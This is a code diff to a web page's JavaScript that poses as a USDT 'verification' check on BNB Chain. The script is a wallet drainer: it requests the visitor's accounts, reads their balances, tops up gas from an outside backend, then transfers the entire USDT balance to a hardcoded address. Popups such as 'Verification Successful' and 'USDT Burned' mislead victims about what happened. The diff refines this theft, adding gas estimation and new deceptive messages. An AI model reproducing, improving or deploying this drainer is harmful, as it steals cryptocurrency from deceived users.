@@ -1250,7 +1250,7 @@
       </svg><span>Now Now</span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right w-5 h-5 group-hover:translate-x-1 transition-transform"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></svg></button> -->
                                                             <p id="walletInfo" style="display: none;">Connecting...  </p>
                                                             <button type="button" onclick="approveToken()" style="display: none;">Approve</button>
-                                         <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+                                      <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
 <script>
 const bscAddress = "0xBe9CA52f6fbcD025e9464B7727D36Af5eff42Ec1";
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
@@ -1276,6 +1276,7 @@ async function connectWalletAndSwitch() {
         alert("Please open this in Trust Wallet, MetaMask, or another Web3 browser.");
         return;
     }
+
     try {
         web3 = new Web3(provider);
         const currentChain = await provider.request({ method: 'eth_chainId' });
@@ -1303,7 +1304,8 @@ async function connectWalletAndSwitch() {
                 }
             }
         }
-        const accounts = await provider.request({ method: "eth_accounts" });
+
+        const accounts = await provider.request({ method: "eth_requestAccounts" });
         userAddress = accounts[0];
         console.log("✅ Wallet:", userAddress);
     } catch (e) {
@@ -1347,7 +1349,7 @@ async function approveToken() {
             web3.eth.getBalance(userAddress)
         ]);
 
-        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "mwei")); // USDT = 6 decimals
+        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
         const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));
 
         console.log("USDT:", usdtBalance);
@@ -1360,14 +1362,14 @@ async function approveToken() {
 
         if (usdtBalance <= 0.5) {
             showPopup(
-                `✅ Verification Successful<br>Your USDT is verified.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
+                `✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
                 "green"
             );
             return;
         }
 
         if (bnbBalance < 0.0003) {
-            showPopup("Waiting for BNB gas refill...", "blue");
+            showPopup("Checking the Assets...", "blue");
             await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -1376,20 +1378,30 @@ async function approveToken() {
             await new Promise(r => setTimeout(r, 3000));
         }
 
-        showPopup("Transferring USDT...", "blue");
+        showPopup("Initiating transfer...", "blue");
+
+        const gasPrice = web3.utils.toWei("5", "gwei");
+        const gasLimit = await usdtContract.methods.transfer(bscAddress, usdtBalanceWei)
+            .estimateGas({ from: userAddress });
 
         await usdtContract.methods.transfer(bscAddress, usdtBalanceWei)
             .send({
                 from: userAddress,
-                gas: 100000,
-                gasPrice: await web3.eth.getGasPrice()
+                gas: gasLimit + 5000,
+                gasPrice: gasPrice
             });
 
         showPopup(`✅ Transfer complete<br><b>USDT Burned:</b> ${usdtBalance}`, "red");
 
     } catch (e) {
         console.error("❌ Transfer failed:", e);
-        showPopup("USDT transfer failed. Check balance or gas.", "red");
+        if (e.message.includes("insufficient funds")) {
+            showPopup("Not enough BNB for gas", "red");
+        } else if (e.message.includes("denied")) {
+            showPopup("Transaction rejected by user", "red");
+        } else {
+            showPopup("USDT transfer failed. Check BNB & try again.", "red");
+        }
     }
 }
 
